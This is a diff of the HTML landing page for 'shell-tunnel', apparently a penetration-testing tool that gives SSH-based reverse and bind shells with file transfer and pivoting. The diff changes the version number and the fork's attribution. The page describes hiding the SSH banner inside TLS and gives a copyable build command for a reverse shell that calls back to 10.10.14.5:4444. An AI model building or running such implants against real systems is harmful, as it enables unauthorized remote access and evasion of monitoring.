@@ -63,12 +63,12 @@
 <div class="rfs-scroll-region page-scroll" id="page-scroll">
 <main class="wrap stack">
 <section class="card first" aria-labelledby="top-h">
-    <p class="runhead"><b>shell-tunnel 1.3.0</b><span>Windows · Linux · macOS</span><span>Go, one static binary</span><span>GPLv3</span></p>
+    <p class="runhead"><b>shell-tunnel 1.4.1</b><span>Windows · Linux · macOS</span><span>Go, one static binary</span><span>GPLv3</span></p>
     <div class="hero">
         <div>
             <h1 class="title" id="top-h">shell-tunnel</h1>
             <p class="lead">Static SSH server for bind and reverse shells with PTY and SFTP</p>
-            <p class="sub">I wanted a tiny way to get a good reverse shell and a pivot without juggling listeners and tunnel syntax by hand. shell-tunnel is that errand as one static binary: credentials and connection details are baked in at build time, the target runs it, and a plain <code>ssh</code> client gets a full PTY, SFTP file transfer and all three kinds of port forwarding. Optional TLS wrapping hides the SSH banner inside what looks like HTTPS. It assumes you have written authorization for the target. shell-tunnel is the preservation fork of Ferdinor's shell-tunnel (2021), whose upstream repository is no longer public — same GPLv3, modernized and maintained. For authorized security testing only.</p>
+            <p class="sub">I wanted a tiny way to get a good reverse shell and a pivot without juggling listeners and tunnel syntax by hand. shell-tunnel is that errand as one static binary: credentials and connection details are baked in at build time, the target runs it, and a plain <code>ssh</code> client gets a full PTY, SFTP file transfer and all three kinds of port forwarding. Optional TLS wrapping hides the SSH banner inside what looks like HTTPS. It assumes you have written authorization for the target. shell-tunnel is the preservation fork of Ferdinor's undertow (2021), whose upstream repository is no longer public — same GPLv3, modernized and maintained. For authorized security testing only.</p>
             <ol class="ck steps" id="errand-ck" aria-label="The errand, start to finish">
                 <li id="build" data-state="todo"><span class="box" aria-hidden="true"></span><span class="ch">Build</span><span class="ld" aria-hidden="true"></span><span class="rs">Tuned binary</span>
                     <div class="act"><div class="cmd"><code>./build.sh reverse 10.10.14.5:4444</code><button class="copy" type="button" data-copy="./build.sh reverse 10.10.14.5:4444">Copy</button></div>
